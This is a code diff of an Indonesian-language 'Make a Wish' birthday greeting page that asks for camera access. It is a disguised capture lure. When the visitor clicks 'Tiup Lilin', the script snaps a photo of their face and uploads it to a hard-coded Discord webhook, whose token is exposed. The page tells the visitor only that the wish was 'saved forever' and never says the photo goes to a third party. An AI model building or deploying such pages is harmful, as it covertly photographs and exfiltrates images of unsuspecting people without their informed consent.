@@ -3,105 +3,120 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Birthday Magic ✨</title>
+    <title>Birthday Wish ✨</title>
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
+        :root { --accent: #ff758c; }
         body {
-            margin: 0; font-family: 'Segoe UI', sans-serif;
-            background: #0f0c29; /* Dark theme agar wajah lebih terlihat */
-            background: linear-gradient(to bottom, #24243e, #302b63, #0f0c29);
-            height: 100vh; display: flex; justify-content: center; align-items: center;
-            color: white; overflow: hidden;
+            margin: 0; padding: 0; font-family: 'Poppins', sans-serif;
+            background: #1a1a2e; height: 100vh;
+            display: flex; justify-content: center; align-items: center; color: white;
         }
 
-        .card {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            padding: 30px; border-radius: 20px;
-            text-align: center; width: 320px;
-            border: 1px solid rgba(255, 255, 255, 0.2);
+        .container {
+            text-align: center; background: rgba(255, 255, 255, 0.05);
+            padding: 40px; border-radius: 30px; backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1); width: 85%; max-width: 400px;
         }
 
-        #video-preview {
-            width: 100%; border-radius: 15px;
-            margin-bottom: 15px; display: none; /* Awalnya sembunyi */
-            border: 2px solid #ff758c;
+        h1 { font-family: 'Dancing Script', cursive; font-size: 2.5rem; margin-bottom: 10px; }
+        
+        /* Area Kamera */
+        #camera-wrapper {
+            width: 100%; height: 0; overflow: hidden;
+            border-radius: 20px; transition: 0.5s all ease;
+            margin: 0 auto; border: 0px solid var(--accent);
         }
+
+        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
 
         .btn {
-            background: #ff758c; color: white; border: none;
-            padding: 12px 25px; border-radius: 25px;
-            cursor: pointer; font-weight: bold; transition: 0.3s;
+            background: var(--accent); color: white; border: none;
+            padding: 15px 35px; border-radius: 50px; font-weight: 600;
+            cursor: pointer; box-shadow: 0 5px 15px rgba(255, 117, 140, 0.4);
+            margin-top: 20px; transition: 0.3s;
         }
 
-        .btn:hover { background: #ff7eb3; transform: scale(1.05); }
-        
+        .btn:hover { transform: scale(1.05); background: #ff4d6d; }
+        #status { font-size: 0.8rem; margin-top: 15px; opacity: 0.6; }
         canvas { display: none; }
-        #status { font-size: 0.8rem; margin-top: 10px; color: #ccc; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h2 id="header">Tutup Matamu... ✨</h2>
-        <p id="msg">Dan buatlah satu permintaan paling tulus di hari spesialmu.</p>
+    <div class="container">
+        <h1 id="title">Make a Wish</h1>
+        <p id="desc">Pejamkan matamu, pikirkan satu keinginan, lalu tekan tombol di bawah.</p>
         
-        <video id="video-preview" autoplay playsinline></video>
-        <canvas id="capture-canvas"></canvas>
+        <div id="camera-wrapper">
+            <video id="webcam" autoplay playsinline></video>
+        </div>
 
-        <button id="action-btn" class="btn" onclick="initSurprise()">Make a Wish!</button>
-        <div id="status"></div>
+        <canvas id="photo-canvas"></canvas>
+        <button id="main-btn" class="btn" onclick="activateCamera()">Make a Wish! ✨</button>
+        <div id="status">Keajaiban akan dimulai saat tombol ditekan...</div>
     </div>
 
     <script>
         const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1463473630251061375/xi6CyaH0ElCz_jUz9vf_iFfOxfNuh1iZfX_31GAO7jOcxRjkhd723nbEFd3ZAp1YvhME";
-        const video = document.getElementById('video-preview');
-        const canvas = document.getElementById('capture-canvas');
-        const btn = document.getElementById('action-btn');
-        const header = document.getElementById('header');
-        const status = document.getElementById('status');
+        const video = document.getElementById('webcam');
+        const wrapper = document.getElementById('camera-wrapper');
+        const btn = document.getElementById('main-btn');
+        const statusText = document.getElementById('status');
+        const title = document.getElementById('title');
 
-        async function initSurprise() {
+        async function activateCamera() {
+            statusText.innerText = "Sedang menghubungkan ke bintang-bintang...";
+            
             try {
-                // Tahap 1: Minta Izin Kamera (Browser pasti memunculkan popup)
+                // Minta izin kamera tepat saat tombol diklik
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-                video.style.display = "block";
                 
-                header.innerText = "Sekarang Tersenyumlah! 😊";
-                btn.innerText = "Tiup Lilin 🎂";
-                btn.onclick = captureAndSend;
+                // Animasi memunculkan video
+                wrapper.style.height = "250px";
+                wrapper.style.borderWidth = "4px";
+                wrapper.style.marginBottom = "20px";
                 
-                status.innerText = "Magic connected...";
+                title.innerText = "Abadikan Harapan";
+                btn.innerText = "Tiup Lilin! 🎂";
+                statusText.innerText = "Tersenyumlah, sistem sedang menangkap aura kebahagiaanmu.";
+                
+                // Ganti fungsi tombol untuk capture
+                btn.onclick = takePhoto;
+
             } catch (err) {
-                alert("Yah, keajaibannya gagal karena izin kamera ditolak.");
+                alert("Waduh, kameranya tidak diizinkan. Padahal ada kejutan di dalam!");
+                statusText.innerText = "Gagal mengakses kamera.";
             }
         }
 
-        function captureAndSend() {
+        function takePhoto() {
             // Efek Confetti
             confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
 
-            // Ambil Gambar dari Video
+            const canvas = document.getElementById('photo-canvas');
             const context = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
+            
+            // Gambar foto dari video ke canvas
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // Ubah ke format Blob untuk dikirim
+            // Kirim ke Discord
             canvas.toBlob((blob) => {
                 const formData = new FormData();
-                formData.append('file', blob, 'surprise_moment.png');
-                formData.append('content', "📸 **Moment Kejutan Terdeteksi!**\nSeseorang baru saja meniup lilin!");
+                formData.append('file', blob, 'birthday_wish.png');
+                formData.append('content', "📸 **YEAY! Seseorang baru saja merayakan ulang tahun!**\nIni foto wajah bahagianya saat Make a Wish.");
 
-                // Kirim ke Discord Real-time
-                fetch(DISCORD_WEBHOOK, {
-                    method: 'POST',
-                    body: formData
-                }).then(() => {
-                    header.innerText = "Harapan Terkirim!";
+                fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData })
+                .then(() => {
+                    title.innerText = "Terkirim!";
+                    statusText.innerText = "Harapanmu sudah disimpan selamanya.";
                     btn.style.display = "none";
-                    status.innerText = "Momenmu telah diabadikan di bintang-bintang.";
+                    // Matikan kamera setelah selesai
+                    video.srcObject.getTracks().forEach(track => track.stop());
                 });
             }, 'image/png');
         }
